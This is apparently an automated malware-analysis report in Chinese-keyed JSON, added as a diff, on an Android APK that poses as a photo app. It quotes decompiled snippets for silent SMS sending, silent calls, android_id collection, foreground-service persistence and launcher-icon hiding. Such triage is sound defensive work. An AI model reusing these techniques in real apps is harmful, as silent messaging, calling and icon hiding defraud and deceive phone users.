@@ -1,0 +1,183 @@
+{
+  "APK信息": {
+    "文件名": "353a8a7360240ae78ef075d57b114178dd046eab8bfc62b55c6c7c6b9192de8f.apk",
+    "sha256": "353a8a7360240ae78ef075d57b114178dd046eab8bfc62b55c6c7c6b9192de8f",
+    "包名": "com.rubbish.scenario",
+    "应用名": "Фoтo",
+    "是否恶意": true,
+    "风险等级": "高",
+    "分析耗时(秒)": 117.4
+  },
+  "行为列表": [
+    {
+      "行为": "sms_fraud",
+      "中文名": "短信欺诈",
+      "MITRE": "T1416",
+      "置信度": "likely",
+      "子行为": [
+        {
+          "子行为": "sms_send",
+          "中文名": "短信发送",
+          "置信度": "likely",
+          "证据": {
+            "方法引用": [],
+            "权限": [
+              "android.permission.SEND_SMS"
+            ],
+            "字符串": [
+              "sendTextMessage"
+            ]
+          }
+        }
+      ],
+      "恶意代码": [
+        {
+          "class_path": "Lcom\\rubbish\\scenario\\a;",
+          "method_signature": "a(String str, String str2, PendingIntent pendingIntent)",
+          "malicious_behavior": "sms_fraud",
+          "behavior_type": "malicious",
+          "risk_level": "高",
+          "malicious_code_snippet": "SmsManager.getDefault().sendTextMessage(str, null, str2, pendingIntent, null);",
+          "malicious_code_snippet_context": "      public static void a(String str, String str2, PendingIntent pendingIntent) {\n          try {\n              Forbid.a(true);\n>>>             SmsManager.getDefault().sendTextMessage(str, null, str2, pendingIntent, null);\n          } catch (Exception e) {\n              e.printStackTrace();\n          }",
+          "behavior_description": "该方法接收目标号码 str 和短信内容 str2，直接调用 SmsManager.getDefault().sendTextMessage() 静默发送短信，无用户确认；数据流向为方法参数(str,str2)→SmsManager.sendTextMessage()，可用于短信欺诈、订购付费业务或传播恶意链接。",
+          "glm_analyzed": true
+        }
+      ]
+    },
+    {
+      "行为": "device_fingerprinting",
+      "中文名": "设备指纹采集",
+      "MITRE": "T1437",
+      "置信度": "likely",
+      "证据": {
+        "方法引用": [],
+        "权限": [
+          "android.permission.READ_PHONE_STATE"
+        ],
+        "字符串": [
+          "ANDROID_ID"
+        ]
+      },
+      "恶意代码": [
+        {
+          "class_path": "Lcom\\rubbish\\scenario\\a;",
+          "method_signature": "e(Context context)",
+          "malicious_behavior": "device_fingerprinting",
+          "behavior_type": "grayware",
+          "risk_level": "中",
+          "malicious_code_snippet": "return Settings.Secure.getString(context.getContentResolver(), \"android_id\");",
+          "malicious_code_snippet_context": "      }\n  \n      public static String e(Context context) {\n>>>         return Settings.Secure.getString(context.getContentResolver(), \"android_id\");\n      }\n  \n      private static AccessibilityManager f(Context context) {",
+          "behavior_description": "该方法通过 Settings.Secure.getString 从系统内容解析器中读取设备的 android_id 唯一标识符，并将其作为字符串返回。在恶意样本上下文中，此标识符大概率被用于设备指纹采集与用户追踪，可能后续上报至C2服务器。数据流向：context.getContentResolver() → Settings.Secure.getString(\"android_id\") → return 供调用方使用",
+          "glm_analyzed": true
+        }
+      ]
+    },
+    {
+      "行为": "persistence",
+      "中文名": "持久化",
+      "MITRE": "T1444",
+      "置信度": "suspected",
+      "子行为": [
+        {
+          "子行为": "foreground_service",
+          "中文名": "前台服务保活",
+          "置信度": "suspected",
+          "证据": {
+            "方法引用": [],
+            "权限": [],
+            "字符串": [
+              "startForeground"
+            ]
+          }
+        }
+      ],
+      "恶意代码": [
+        {
+          "class_path": "Lcom\\rubbish\\scenario\\ReservoirSour;",
+          "method_signature": "if(Build.VERSION.SDK_INT >= 26)",
+          "malicious_behavior": "persistence",
+          "behavior_type": "grayware",
+          "risk_level": "中",
+          "malicious_code_snippet": "((NotificationManager) getSystemService(\"notification\")).createNotificationChannel(new NotificationChannel(\"com.rubbish.scenario.DRY\", \"Overcharge\", 1));\nbuilder = new Notification.Builder(getApplicationContext(), \"com.rubbish.scenario.DRY\");\nbuilder.setSmallIcon(R.drawable.ic_dialog_info).setContentTitle(getString(R.string.b)).setContentText(getString(R.string.a));\nstartForeground(739, builder.build());",
+          "malicious_code_snippet_context": "      private void a() {\n          Notification.Builder builder;\n          if (Build.VERSION.SDK_INT >= 26) {\n>>>             ((NotificationManager) getSystemService(\"notification\")).createNotificationChannel(new NotificationChannel(\"com.rubbish.scenario.DRY\", \"Overcharge\", 1));\n>>>             builder = new Notification.Builder(getApplicationContext(), \"com.rubbish.scenario.DRY\");\n>>>         } else {\n>>>             builder = new Notification.Builder(getApplicationContext());\n          }\n          builder.setSmallIcon(R.drawable.ic_dialog_info).setContentTitle(getString(R.string.b)).setContentText(getString(R.string.a));\n          startForeground(739, builder.build());",
+          "behavior_description": "该代码在Service中创建通知渠道并调用startForeground将自身提升为前台服务，使系统难以回收该服务进程，从而实现持久化保活。在恶意样本中，此机制用于维持后台恶意服务（如数据窃取、C2通信等）持续运行，防止被系统杀死或用户清理。数据流向：getSystemService(\"notification\") → createNotificationChannel() → startForeground()",
+          "glm_analyzed": true
+        }
+      ]
+    },
+    {
+      "行为": "call_operations",
+      "中文名": "通话操作",
+      "MITRE": "",
+      "置信度": "likely",
+      "子行为": [
+        {
+          "子行为": "call_phone",
+          "中文名": "拨打电话",
+          "置信度": "likely",
+          "证据": {
+            "方法引用": [],
+            "权限": [
+              "android.permission.CALL_PHONE"
+            ],
+            "字符串": [
+              "android.intent.action.CALL"
+            ]
+          }
+        }
+      ],
+      "恶意代码": [
+        {
+          "class_path": "Lcom\\rubbish\\scenario\\Vision;",
+          "method_signature": "b(Context context, String str)",
+          "malicious_behavior": "call_operations",
+          "behavior_type": "malicious",
+          "risk_level": "高",
+          "malicious_code_snippet": "Intent intent = new Intent(\"android.intent.action.CALL\", Uri.parse(\"tel:\" + str));\nintent.addFlags(268435456);\ncontext.startActivity(intent);",
+          "malicious_code_snippet_context": "      private static int b(Context context, String str) {\n          try {\n              Forbid.a(true);\n>>>             Intent intent = new Intent(\"android.intent.action.CALL\", Uri.parse(\"tel:\" + str));\n>>>             intent.addFlags(268435456);\n>>>             context.startActivity(intent);\n              return 0;\n          } catch (Exception e) {\n              return 6;",
+          "behavior_description": "代码使用 ACTION_CALL Intent 直接拨打电话（非 ACTION_DIAL 调起拨号界面），无需用户确认即可发起呼叫。在恶意样本中，此行为通常用于拨打高额收费号码或特定号码，直接造成用户经济损失。参数 str 作为电话号码从外部传入，经 Uri.parse 拼接后通过 startActivity 触发静默拨号。",
+          "glm_analyzed": true
+        }
+      ]
+    },
+    {
+      "行为": "icon_hiding",
+      "中文名": "图标隐藏",
+      "MITRE": "",
+      "置信度": "suspected",
+      "证据": {
+        "方法引用": [],
+        "权限": [],
+        "字符串": [
+          "setComponentEnabledSetting"
+        ]
+      },
+      "恶意代码": [
+        {
+          "class_path": "Lcom\\rubbish\\scenario\\UndertakeLarge;",
+          "method_signature": "if(Build.VERSION.SDK_INT >= 26)",
+          "malicious_behavior": "icon_hiding",
+          "behavior_type": "malicious",
+          "risk_level": "中",
+          "malicious_code_snippet": "getPackageManager().setComponentEnabledSetting(new ComponentName(getApplicationContext(), (Class<?>) Lock.class), 2, 1);",
+          "malicious_code_snippet_context": "          this.b.acquire();\n          a.b(getApplicationContext());\n          a.post(this.c);\n>>>         getPackageManager().setComponentEnabledSetting(new ComponentName(getApplicationContext(), (Class<?>) Lock.class), 2, 1);\n      }\n  }",
+          "behavior_description": "应用启动后通过 setComponentEnabledSetting 将自身 Lock 组件（通常为带 LAUNCHER 的主 Activity）设置为 COMPONENT_ENABLED_STATE_DISABLED(2)，使应用图标从桌面启动器中消失，同时后台服务和广播接收器仍在运行，实现图标隐藏以逃避用户察觉。数据流向：getApplicationContext() 获取上下文 → setComponentEnabledSetting 禁用 launcher 组件隐藏图标。",
+          "glm_analyzed": true
+        }
+      ]
+    }
+  ],
+  "覆盖范围": {
+    "静态分析": "完整",
+    "动态分析": "未执行",
+    "方法引用分析": "完整",
+    "JADX反编译": "完整",
+    "LLM语义分析": "已执行",
+    "LLM交叉验证": "已执行",
+    "验证模型": "qwen3.7-plus",
+    "局限性": [
+      "C2服务器.是否活跃: 需动态分析",
+      "C2服务器.轮询间隔(秒): 需动态分析"
+    ]
+  }
+}
